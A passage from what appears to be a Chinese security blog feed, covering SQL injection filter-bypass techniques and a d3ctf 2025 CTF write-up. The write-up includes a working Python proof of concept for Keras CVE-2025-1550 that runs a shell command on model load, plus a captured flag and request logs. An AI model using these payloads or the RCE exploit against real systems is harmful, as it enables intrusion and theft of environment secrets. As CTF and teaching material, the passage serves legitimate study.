中,<br>会用到逗号 可以使用 from for 代替:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(DATABASE() <span class="keyword">FROM</span> <span class="number">1</span> <span class="keyword">FOR</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(DATABASE() <span class="keyword">FROM</span> <span class="number">1</span> <span class="keyword">FOR</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">SELECT</span> MID(DATABASE() <span class="keyword">FROM</span> <span class="number">1</span> <span class="keyword">FOR</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>LIMIT 语法也会用到逗号，可以使用 offset 代替:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users LIMIT 1 OFFSET 0;</span><br></pre></td></tr></table></figure><p>盲注中也可以使用模糊查询的方法来避免使用逗号:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE() <span class="keyword">LIKE</span> <span class="string">&#x27;s%&#x27;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">等价于 SELECT ASCII(SUBSTRING(DATABASE(), 1, 1))=115;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">s% 是一个模式字符串，其中 % 是通配符</span></span><br><span class="line"><span class="comment">% 表示任意数量的字符（包括零个字符）</span></span><br><span class="line"><span class="comment">s% 匹配所有以 s 开头的字符串，不论其后有多少字符</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>LIKE 支持以下通配符：</p><ul><li>%：匹配零个或多个字符。</li><li>_：匹配单个字符。</li></ul><p>示例：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LIKE</span> <span class="string">&#x27;u%&#x27;</span>：匹配以 u 开头的所有字符串。</span><br><span class="line"><span class="keyword">LIKE</span> <span class="string">&#x27;%123&#x27;</span>：匹配以 <span class="number">123</span> 结尾的所有字符串。</span><br><span class="line"><span class="keyword">LIKE</span> <span class="string">&#x27;_b%&#x27;</span>：匹配第二个字符是 b 的所有字符串（如 ab123、cb_test）。</span><br><span class="line"><span class="keyword">LIKE</span> <span class="string">&#x27;t__t&#x27;</span>：匹配 t 开头、接两个字符、然后是 t 的字符串（如 test）</span><br></pre></td></tr></table></figure><ul><li><h3 id="过滤比较符"><a href="#过滤比较符" class="headerlink" title="过滤比较符"></a>过滤比较符</h3></li></ul><p>过滤<code>&gt;</code>和<code>&lt;</code>时<br>可以使用<code>greatest()</code>和<code>least()</code>函数，<br>分别返回最大值和最小值。参数数量不定:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GREATEST(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">SELECT</span> LEAST(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>代替等号用<code>like</code>但有时会有不相等还返回1</p><p>用<code>rlike</code>判断某个字段的值是否匹配指定的正则表达式，<br>它是<code>regexp</code>的同义词</p><p>用<code>regexp</code>匹配字符串中是否包含符合正则规则的部分,<br>默认不区分大小写,<br>如果需要区分，可以使用<code>binary</code>:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;abc&#x27;</span> REGEXP <span class="string">&#x27;A&#x27;</span>;       <span class="comment">-- 返回 1</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">BINARY</span> <span class="string">&#x27;abc&#x27;</span> REGEXP <span class="string">&#x27;A&#x27;</span>; <span class="comment">-- 返回 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">BINARY</span> DATABASE() REGEXP <span class="string">&#x27;^s&#x27;</span>;</span><br></pre></td></tr></table></figure><p>函数<br><code>strcmp(str1, str2)</code><br>其返回值:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">str1 = str2 -&gt; 0</span><br><span class="line">str1 &lt; str2 -&gt; -1</span><br><span class="line">str1 &gt; str2 -&gt; 1</span><br></pre></td></tr></table></figure><p>可以用<code>in</code>语法，<br>用于判断某个值是否在指定集合中的条件操作符:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 是则返回 1,否则返回 0</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(DATABASE(), <span class="number">1</span>, <span class="number">1</span>)) <span class="keyword">IN</span> (<span class="number">115</span>);</span><br></pre></td></tr></table></figure><p>用<code>between...and...</code>进行范围查询，也可代替等号</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 是 115 则返回 1,否则返回 0</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(DATABASE(), <span class="number">1</span>, <span class="number">1</span>)) <span class="keyword">BETWEEN</span> <span class="number">115</span> <span class="keyword">AND</span> <span class="number">115</span>;</span><br></pre></td></tr></table></figure><p>用<code>&lt;&gt;</code>表示不等于</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 不等于 115 则返回 1,否则返回 0</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(DATABASE(), <span class="number">1</span>, <span class="number">1</span>)) <span class="operator">&lt;&gt;</span> <span class="number">115</span>;</span><br></pre></td></tr></table></figure><ul><li><h3 id="过滤逻辑运算符"><a href="#过滤逻辑运算符" class="headerlink" title="过滤逻辑运算符"></a>过滤逻辑运算符</h3></li></ul><p>可以与英文单词互相替换:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">&amp;&amp;</span></span><br><span class="line"><span class="keyword">or</span> <span class="operator">||</span></span><br><span class="line"><span class="keyword">not</span> <span class="operator">!</span></span><br><span class="line">xor <span class="operator">|</span></span><br></pre></td></tr></table></figure><ul><li><h3 id="过滤-if"><a href="#过滤-if" class="headerlink" title="过滤 if"></a>过滤 if</h3></li></ul><p>逻辑中断: <code>OR ||</code><br>只需一个表达式为真，整个表达式就为真。<br>那么很多时候程序只判断到前一个表达式为真时，<br>就忽略后一个表达式不执行，<code>MySQL</code>就具备这个特性。<br>可以利用它达到条件判断的效果:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 假设 database 为 &quot;security&quot;</span></span><br><span class="line"><span class="comment">-- 它不会执行 SLEEP，因为前一个表达式为真</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(DATABASE(), <span class="number">1</span>, <span class="number">1</span>))<span class="operator">=</span><span class="number">115</span> <span class="operator">||</span> SLEEP(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 它会执行 SLEEP，因为前一个表达式为假，程序还需要判断后一个表达式才能确定整个表达式的值</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(DATABASE(), <span class="number">1</span>, <span class="number">1</span>))<span class="operator">=</span><span class="number">114</span> <span class="operator">||</span> SLEEP(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>使用<code>locate(str1, str2)</code><br>比较输入的两个字符串，<br>第一个参数是参照物，第二个参数是参照对象，<br>该函数会判断参照对象中是否含有参照物，<br>若不含有，则返回 0；<br>若含有，则返回该参照物在参照对象中的位置:</p><p>用<code>case when...then...else...end</code><br>用法类似于三目运算符</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="keyword">condition</span> <span class="keyword">THEN</span> result1 <span class="keyword">ELSE</span> result2 <span class="keyword">END</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 1</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">2</span> <span class="keyword">END</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">2</span> <span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><p>用<code>elt(N, str1, str2, ..., strN)</code><br>从一个字符串列表中返回对应位置的字符串<br>假设有一张表 my_table，<br>包含字段 id 和 category，<br>我们希望根据 category 的值返回对应字符串：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, ELT(category, <span class="string">&#x27;Electronics&#x27;</span>, <span class="string">&#x27;Books&#x27;</span>, <span class="string">&#x27;Clothing&#x27;</span>)</span><br><span class="line"><span class="keyword">AS</span> category_name</span><br><span class="line"><span class="keyword">FROM</span> my_table;</span><br></pre></td></tr></table></figure><p>如果 category 的值为 1、2 或 3，<br>分别返回 Electronics、Books、Clothing</p><p>这个函数同样可以用在盲注中,<br>逻辑运算往往会返回 0 或 1，<br>也就是说可以让条件为真时,<br>执行<code>elt</code>函数第二个参数的表达式</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 条件为真时会睡 3 秒</span></span><br><span class="line"><span class="keyword">SELECT</span> ELT((LENGTH(DATABASE())<span class="operator">&gt;</span><span class="number">3</span>), SLEEP(<span class="number">3</span>));</span><br></pre></td></tr></table></figure><ul><li><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3></li></ul><p>如果只是单纯去掉，那就双写绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union -&gt; uniunionon</span><br></pre></td></tr></table></figure><p>如果过滤大小写，那就随意替换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union、UNION -&gt; UnIoN</span><br></pre></td></tr></table></figure><p>过滤关键字组合比如过滤了<code>UNION SELECT</code><br>可以改用<code>UNION ALL SELECT</code><br>或者结合内联注释构造: <code>/*!UNION*/SELECT UNION/**/SELECT</code><br>或者插入其他可代替空格的符号</p><ul><li><h3 id="过滤-information-schema"><a href="#过滤-information-schema" class="headerlink" title="过滤 information_schema"></a>过滤 information_schema</h3></li></ul><p>InnoDB 引擎<br>在<code>MySQL 5.6</code>及以上<br>用<code>mysql.innodb_table_stats</code><br>代替<code>information_schema.tables</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from mysql.innodb_table_stats;</span><br><span class="line">+---------------+-----------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">| database_name | table_name      | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |</span><br><span class="line">+---------------+-----------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">| bookmanage    | book            | 2024-11-08 16:57:53 |    100 |                    1 |                        0 |</span><br><span class="line">| bookmanage    | person          | 2024-11-08 16:57:43 |    103 |                    1 |                        0 |</span><br><span class="line">| bookmanage    | record          | 2024-11-08 16:58:04 |    100 |                    1 |                        0 |</span><br><span class="line">| mysql         | component       | 2024-07-29 00:04:12 |      0 |                    1 |                        0 |</span><br><span class="line">| sakila        | actor           | 2024-07-29 00:05:44 |    200 |                    1 |                        1 |</span><br><span class="line">| sakila        | address         | 2024-07-29 00:04:52 |    603 |                    6 |                        1 |</span><br><span class="line">| sakila        | category        | 2024-07-29 00:04:52 |     16 |                    1 |                        0 |</span><br><span class="line">| sakila        | city            | 2024-07-29 00:04:52 |    600 |                    3 |                        1 |</span><br><span class="line">| sakila        | country         | 2024-07-29 00:04:52 |    109 |                    1 |                        0 |</span><br><span class="line">| sakila        | customer        | 2024-07-29 00:04:52 |    599 |                    5 |                        3 |</span><br><span class="line">| sakila        | film            | 2024-07-29 00:04:52 |   1000 |                   12 |                        5 |</span><br><span class="line">| sakila        | film_actor      | 2024-07-29 00:04:52 |   5462 |                   12 |                        5 |</span><br><span class="line">| sakila        | film_category   | 2024-07-29 00:04:53 |   1000 |                    4 |                        1 |</span><br><span class="line">| sakila        | film_text       | 2024-07-29 00:04:52 |   1000 |                   11 |                        1 |</span><br><span class="line">| sakila        | inventory       | 2024-07-29 00:04:53 |   4581 |                   11 |                       12 |</span><br><span class="line">| sakila        | language        | 2024-07-29 00:04:53 |      6 |                    1 |                        0 |</span><br><span class="line">| sakila        | payment         | 2024-07-29 00:04:54 |  16500 |                   97 |                       39 |</span><br><span class="line">| sakila        | rental          | 2024-07-29 00:05:04 |  15423 |                   97 |                       73 |</span><br><span class="line">| sakila        | staff           | 2024-07-29 00:05:14 |      2 |                    4 |                        2 |</span><br><span class="line">| sakila        | store           | 2024-07-29 00:05:24 |      2 |                    1 |                        2 |</span><br><span class="line">| sys           | sys_config      | 2024-07-29 00:04:13 |      6 |                    1 |                        0 |</span><br><span class="line">| world         | city            | 2024-07-29 00:05:34 |   4035 |                   25 |                        7 |</span><br><span class="line">| world         | country         | 2024-07-29 00:05:54 |    239 |                    7 |                        0 |</span><br><span class="line">| world         | countrylanguage | 2024-07-29 00:06:04 |    984 |                    6 |                        4 |</span><br><span class="line">+---------------+-----------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">24 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><h3 id="过滤注释符"><a href="#过滤注释符" class="headerlink" title="过滤注释符"></a>过滤注释符</h3></li></ul><p>如果所有的注释符<code>--  # /**/ /*!*/</code>都被过滤，<br>无法忽略后面的语句,<br>可以改变闭合方式以避免语法错误:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">AND</span> passwd<span class="operator">=</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>发送payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;OR&amp;passwd=OR&#x27;</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span><span class="keyword">OR</span><span class="string">&#x27; AND passwd=&#x27;</span><span class="keyword">OR</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>也可以闭合引号</p><ul><li><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3></li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- SELECT username FROM users;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">char</span>(<span class="number">117</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">101</span>) <span class="keyword">FROM</span> users;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">0x757365726e616d65</span> <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure><ul><li><h3 id="花括号语法"><a href="#花括号语法" class="headerlink" title="花括号语法"></a>花括号语法</h3></li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &#123;a DATABASE()&#125;;</span><br></pre></td></tr></table></figure><p>花括号左边是注释（左边可以是任意字母，但不能是数字），<br>右边是查询语句的一部分</p><ul><li><h3 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h3></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">benchmark() =&gt; sleep()</span><br><span class="line">hex() bin() =&gt; ascii()</span><br><span class="line">concat() concat_ws() =&gt; group_concat()</span><br><span class="line">substr() mid() left() right() elt() =&gt; substring()</span><br><span class="line">char_length() =&gt; length()</span><br></pre></td></tr></table></figure><ul><li><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 GBK 编码下，部分字符可以与后续字符拼接形成新的合法字符。%df 在 GBK 编码中是一个未完成的双字节字符 Ÿ，如果数据库采用 GBK 编码，则 %df 可能会与后续的单字符拼接形成一个完整的双字节字符</span><br><span class="line"></span><br><span class="line">有时候服务端会对输入中的特殊字符进行转义，在前面添加一个 \，它的 URL 编码是 %5c。如果输入一个 &#x27;，添加反斜杠编码后就是 %5c%27。此时在前面加上一个 %df -&gt; %df%5c%27，如果数据库采用 GBK 编码，会认为 %df%5c 是一个宽字符，使得 %27 即 &#x27; 并没有被转义，可以正常进行注入</span><br></pre></td></tr></table></figure><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p><a href="https://medium.com/@0x3adly/from-sql-injection-to-rce-leveraging-vulnerability-for-maximum-impact-2fb356907eed">https://medium.com/@0x3adly/from-sql-injection-to-rce-leveraging-vulnerability-for-maximum-impact-2fb356907eed</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>d3ctf复现</title>
      <link href="/2025/06/05/2025d3ctf/"/>
      <url>/2025/06/05/2025d3ctf/</url>
      
        <content type="html"><![CDATA[<h3 id="d3model"><a href="#d3model" class="headerlink" title="d3model"></a>d3model</h3><p>审源码项目<br>依赖的版本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keras==3.8.0</span><br><span class="line">flask</span><br><span class="line">tensorflow</span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_model</span>(<span class="params">modelname</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        keras.models.load_model(modelname)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No file part&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No selected file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    MAX_FILE_SIZE = <span class="number">50</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 50MB</span></span><br><span class="line">    file.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">    file_size = file.tell()</span><br><span class="line">    file.seek(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;File size exceeds 50MB limit&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;test.keras&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        os.remove(filepath)</span><br><span class="line">    file.save(filepath)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is_valid_model(filepath):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Model is valid&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid model file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>可以上传一个不大于50MB的文件，<br>根据<code>keras</code>的版本找到<code>CVE-2025-1550</code><br>在<code>loal_model</code>处触发漏洞，可以实现命令执行<br>参考这个链接使用的POC:<br><a href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">model_name = <span class="string">&quot;test.keras&quot;</span></span><br><span class="line"></span><br><span class="line">x_train = np.random.rand(<span class="number">100</span>, <span class="number">28</span> * <span class="number">28</span>)</span><br><span class="line">y_train = np.random.rand(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">model = Sequential([Dense(<span class="number">1</span>, activation=<span class="string">&#x27;linear&#x27;</span>, input_dim=<span class="number">28</span> * <span class="number">28</span>)])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>, loss=<span class="string">&#x27;mse&#x27;</span>)</span><br><span class="line">model.fit(x_train, y_train, epochs=<span class="number">5</span>)</span><br><span class="line">model.save(model_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    config = json.loads(f.read(<span class="string">&quot;config.json&quot;</span>).decode())</span><br><span class="line"></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;module&quot;</span>] = <span class="string">&quot;keras.models&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;class_name&quot;</span>] = <span class="string">&quot;Model&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;config&quot;</span>] = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;layers&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;class_name&quot;</span>: <span class="string">&quot;function&quot;</span>,</span><br><span class="line">            <span class="string">&quot;config&quot;</span>: <span class="string">&quot;Popen&quot;</span>,</span><br><span class="line">            <span class="string">&quot;module&quot;</span>: <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">            <span class="string">&quot;inbound_nodes&quot;</span>: [&#123;<span class="string">&quot;args&quot;</span>: [[<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;env&gt;&gt;index.html&quot;</span>]], <span class="string">&quot;kwargs&quot;</span>: &#123;<span class="string">&quot;bufsize&quot;</span>: -<span class="number">1</span>&#125;&#125;]</span><br><span class="line">        &#125;],</span><br><span class="line">    <span class="string">&quot;input_layers&quot;</span>: [[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]],</span><br><span class="line">    <span class="string">&quot;output_layers&quot;</span>: [[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_read:</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> zip_write:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> zip_read.infolist():</span><br><span class="line">            <span class="keyword">if</span> item.filename != <span class="string">&quot;config.json&quot;</span>:</span><br><span class="line">                zip_write.writestr(item, zip_read.read(item.filename))</span><br><span class="line"></span><br><span class="line">os.remove(model_name)</span><br><span class="line">os.rename(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>, model_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">    zf.writestr(<span class="string">&quot;config.json&quot;</span>, json.dumps(config))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Malicious model ready&quot;</span>)</span><br></pre></td></tr></table></figure><p>先创建一个正常的模型，然后根据其压缩包的性质解压并修改config<br>修改一下系统命令就可以使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FLAG=d3ctf&#123;moD3L-IO@D-r3@LIy-c4UsE5_rc383ad8b&#125;</span><br></pre></td></tr></table></figure><h3 id="d3invitation"><a href="#d3invitation" class="headerlink" title="d3invitation"></a>d3invitation</h3><p>是一个生成邀请函的web服务<br>先正常使用看一下全流程<br><img src="/2025/06/05/2025d3ctf/1.png" alt="alt text"><br>其中<code>/api/genSTSCreds</code>接口，<br>会根据文件名发放token:</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/genSTSCreds</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>35.241.98.126:31138</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://35.241.98.126:31138</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://35.241.98.126:31138/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;object_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;20240704193708.jpg&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 04 Jun 2025 12:53:24 GMT</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>668</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;access_key_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;7SWYYK5QNPONE8H3XMX9&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json"><span 